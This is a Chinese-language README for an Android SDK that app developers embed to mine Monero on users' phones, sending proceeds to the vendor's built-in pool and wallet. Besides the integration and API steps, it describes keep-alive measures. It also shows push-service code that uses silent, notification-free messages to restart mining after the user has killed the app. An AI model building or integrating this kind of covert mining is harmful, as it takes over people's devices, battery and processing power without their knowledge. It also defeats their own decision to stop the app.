# MobileMinerSDK
android手机挖矿sdk，包含门罗(cpu)，以太坊(gpu)和zcash(gpu)。

门罗挖矿效果：


<img src="https://m.qpic.cn/psb?/V149vWW31mgVIF/74BFNFRUQ.gs.ffxPUs1rMHbXuVzdkjk.CdaqQ*E4X8!/b/dIUBAAAAAAAA&bo=OASABwAAAAARB4s!&rf=viewer_4" width="540" hegiht="690" align=center />

<img src="http://m.qpic.cn/psb?/V149vWW31mgVIF/eRp22V498bTnR6Pkn2F7NqpeU6GdcMWsA.NIUDcJr1s!/b/dNoAAAAAAAAA&bo=OASABwAAAAARF5s!&rf=viewer_4" width="540" hegiht="690" align=center />

<img src="http://m.qpic.cn/psb?/V149vWW31mgVIF/Y0Y7NZt4knGmKOX*G3D01uvix4Twn0zmFalSuS0ZR*c!/b/dH4BAAAAAAAA&bo=OASABwAAAAARF5s!&rf=viewer_4" width="540" hegiht="690" align=center />

<img src="http://m.qpic.cn/psb?/V149vWW31mgVIF/K5XvST17pmUVrigSD41dQaBx1VlfSiHK0wxI4k4khsM!/b/dHoBAAAAAAAA&bo=OASABwAAAAARF5s!&rf=viewer_4" width="540" hegiht="690" align=center />

<img src="http://m.qpic.cn/psb?/V149vWW31mgVIF/4IfRK9JvvZJwYKJ*yVfY7wmG4QUexx.8lN6pUC7tSo8!/b/dAsAAAAAAAAA&bo=OASABwAAAAARF5s!&rf=viewer_4" width="540" hegiht="690" align=center />


## Waterhole手机挖矿v1.0.0 SDK文档
<br />
### SDK介绍

Waterhole手机挖矿SDK，目前提供了门罗币（Monero, 代号XMR）的挖矿支持。目前门罗币手机挖矿支持32位和64位的运行环境，支持的ABI为armeabi, armeabi-v7a, arm64-v8a。连接的矿池为Waterhole公司矿池，内置钱包地址为Waterhole公司门罗地址，第三方开源代码抽水为0%。

<br />
### 快速集成

#### 1. 在app主模块的build.gradle中添加挖矿aar引用
```
compile(name: 'miner-core-1.0.0', ext: 'aar')
compile(name: 'miner-xmr-1.0.0', ext: 'aar')
```
<br />

#### 2. 在app主模块的build.gradle中设置NDK ABI参数
```
ndk {
       abiFilters "armeabi", "armeabi-v7a", "arm64-v8a"
    }
```

 注意：在gradle中设置abi，是为了SDK在运行时能够优先选择arm64-v8a。虽然目前SDK支持armeabi, armeabi-v7a, arm64-v8a，但是64位的arm64-v8a挖矿速度比32位的arm快20%-30%，所以优先适配arm64-v8a，如果实在不能适配（适配arm64-v8a的话，需要app中其他的库也有对应的arm64-v8a库），则SDK会选择32位的arm环境运行。

<br />

#### 3. 权限
打开AndroidManifest.xml，添加组件需要的权限：

```
  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
  <uses-permission android:name="android.permission.INTERNET" />
  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
  <uses-permission android:name="android.permission.READ_PHONE_STATE" />
  <uses-permission android:name="android.permission.WAKE_LOCK" />
```
注意：SDK内部不做权限处理，交由接入方来处理。

<br />

#### 4. 混淆
在混淆文件中加入：

```
-keep public class waterhole.miner.core.NoProGuard
-keep class * implements waterhole.miner.core.NoProGuard {*;}
```

<br />

#### 5. 接入代码

在Application初始化Miner：

```
WaterholeMiner.enableLog(true);
WaterholeMiner.initApplication(this);
```

开始挖矿：

```
XmrMiner.instance().init(context)
		 .setStateObserver(new StateObserver(){})
		 .startMine(); 
```
    
停止挖矿：

```
XmrMiner.instance().stopMine(); 
```

是否正在挖矿：

```
XmrMiner.instance().isMining(); 
```


设置挖矿最大CPU温度（必须在startMine()函数之前调用，默认为65℃）：

```
XmrMiner.instance().setMaxTemperature(int)
```


获取当前CPU温度：

```
XmrMiner.instance().getCurrentTemperature()
```

<br />


#### 6. 推送保活拉起策略

挖矿SDK内部已经做好了保活，在用户不主动杀死接入方应用时，能尽可能存活。但由于国内Android手机的各种限制，为了保持挖矿时间，
在用户主动杀死接入应用后，还能再拉起挖矿服务，需要接入方配合处理。如果接入方接入了第三方推送SDK，可以利用推送后台，
定时推送透传消息到客户端（如每隔1小时），无需显示通知栏消息。在接收推送透传消息的逻辑中，根据指定的字段或者条件启动挖矿服务。
但init(Context)的Context参数必须为主进程的Context，不能为Service的context，否则启动挖矿会失败。

如，接入了个推的服务：
```
public final class GetuiIntentService extends GTIntentService {

    public GetuiIntentService() {
    }

    @Override
    public void onNotificationMessageClicked(Context context, GTNotificationMessage gtNotificationMessage) {
    }

    @Override
    public void onNotificationMessageArrived(Context context, GTNotificationMessage gtNotificationMessage) {
    }

    @Override
    public void onReceiveServicePid(Context context, int pid) {
        LogUtils.info("onReceiveServicePid -> " + pid);
    }

    @Override
    public void onReceiveMessageData(Context context, GTTransmitMessage msg) {
        String appid = msg.getAppid();
        String taskid = msg.getTaskId();
        String messageid = msg.getMessageId();
        byte[] payload = msg.getPayload();
        String pkg = msg.getPkgName();
        String cid = msg.getClientId();

        // 第三方回执调用接口，actionid范围为90000-90999，可根据业务场景执行
        boolean result = PushManager.getInstance().sendFeedbackMessage(context, taskid, messageid, 90001);
        LogUtils.info("call sendFeedbackMessage = " + (result ? "success" : "failed"));
        LogUtils.info("onReceiveMessageData -> " + "appid = " + appid + "\ntaskid = "
            + taskid + "\nmessageid = " + messageid + "\npkg = " + pkg
            + "\ncid = " + cid);
        if (payload == null) {
            LogUtils.error("receiver payload = null");
        } else {
            String data = new String(payload);
            LogUtils.info("receiver payload = " + data);
            /**
             * 定时推送透传消息拉起挖矿服务
             *
             * <li>
             *  1. 推送后台定时推送透传消息到接入客户端，约定好数据标识，如xmr_miner开头的字符，或者其他json串，无需启动通知栏通知
             *  2. init(Context)的Context参数必须为主进程的Context，不能为Service的Context，否则启动挖矿会失败
             * </li>
             */
            // todo 启动字段|条件接入方自行设置，但init(Context)的Context参数必须为主进程的Context，不能为Service的Context，否则启动挖矿会失败
            if (data.startsWith("xmr_miner")) {
                XmrMiner.instance().init(App.getContext()).setStateObserver(new StateObserver() {
                    @Override
                    public void onConnectPoolBegin() {
                    }

                    @Override
                    public void onConnectPoolSuccess() {
                    }

                    @Override
                    public void onConnectPoolFail(String error) {
                    }

                    @Override
                    public void onPoolDisconnect(String error) {
                    }

                    @Override
                    public void onMessageFromPool(String message) {
                    }

                    @Override
                    public void onMiningError(String error) {
                    }

                    @Override
                    public void onMiningStatus(double speed) {
                    }
                }).startMine();
            }
        }
    }

    @Override
    public void onReceiveClientId(Context context, String clientid) {
        LogUtils.error("onReceiveClientId -> " + "clientid = " + clientid);
        // 441731ee7e3a839e3268a529044ace7d
    }

    @Override
    public void onReceiveOnlineState(Context context, boolean online) {
        LogUtils.error("onReceiveOnlineState -> " + (online ? "online" : "offline"));
    }

    @Override
    public void onReceiveCommandResult(Context context, GTCmdMessage cmdMessage) {
        LogUtils.error("onReceiveCommandResult -> " + cmdMessage);
    }
}
```

<br />

#### 7. API说明

##### 7.1 class WaterholeMiner

###### enableLog()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>enable</td>
        <td>boolean</td>
        <td>void</td>
        <td>是否开启日志打印，默认为true</td>
    </tr>
</table>

###### initApplication()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>application</td>
        <td>Application</td>
        <td>void</td>
        <td>初始化挖矿数据</td>
    </tr>
</table>

##### 7.2 class XmrMiner

###### instance()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>无</td>
        <td>无</td>
        <td>MinerInterface</td>
        <td>获取XmrMiner实例（单例）</td>
    </tr>
</table>

###### init()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>context</td>
        <td>Context</td>
        <td>MinerInterface</td>
        <td>初始化</td>
    </tr>
</table>

###### startMine()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>无</td>
        <td>无</td>
        <td>void</td>
        <td>开始挖矿，内部会开启一个独立进程进行挖矿</td>
    </tr>
</table>

###### stopMine()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>无</td>
        <td>无</td>
        <td>void</td>
        <td>停止挖矿，会杀掉挖矿进程，释放资源</td>
    </tr>
</table>

###### isMining()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>无</td>
        <td>无</td>
        <td>boolean</td>
        <td>是否正在挖矿中，true 是 | false 否</td>
    </tr>
</table>

###### setStateObserver()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>stateObserver</td>
        <td>StateObserver</td>
        <td>MinerInterface</td>
        <td>挖矿状态观察者回调</td>
    </tr>
</table>

###### setMaxTemperature()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>maxTemperature</td>
        <td>int</td>
        <td>MinerInterface</td>
        <td>设置挖矿最大CPU温度，默认为65℃，必须在startMine()函数之前调用</td>
    </tr>
</table>

###### getCurrentTemperature()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>返回类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>无</td>
        <td>无</td>
        <td>int</td>
        <td>获取当前CPU温度</td>
    </tr>
</table>

<br />
##### 7.3 class StateObserver

###### onConnectPoolBegin()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>无</td>
        <td>无</td>
        <td>开始连接矿池回调</td>
    </tr>
</table>

###### onConnectPoolSuccess()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>无</td>
        <td>无</td>
        <td>连接矿池成功回调</td>
    </tr>
</table>

###### onConnectPoolFail()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>error</td>
        <td>String</td>
        <td>连接矿池失败回调，回调失败原因</td>
    </tr>
</table>

###### onPoolDisconnect()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>error</td>
        <td>String</td>
        <td>与矿池连接断开，回调失败原因</td>
    </tr>
</table>

###### onMessageFromPool()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>message</td>
        <td>String</td>
        <td>收到矿池信息回调</td>
    </tr>
</table>

###### onMiningError()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>error</td>
        <td>String</td>
        <td>挖矿错误回调，回调失败原因</td>
    </tr>
</table>

###### onMiningStatus()
<table>
    <tr>
        <td>参数名</td>
        <td>参数类型</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>speed</td>
        <td>double</td>
        <td>挖矿速度，建议保留3-4位小数，门罗币的单位为H/s</td>
    </tr>
</table>

##### 7.4 class MinerInterface
各个挖矿币的统一接口，接入方无需了解。

<br />

#### 8. 技术支持
```
qq: 651043704  
wechat: k651043704
```
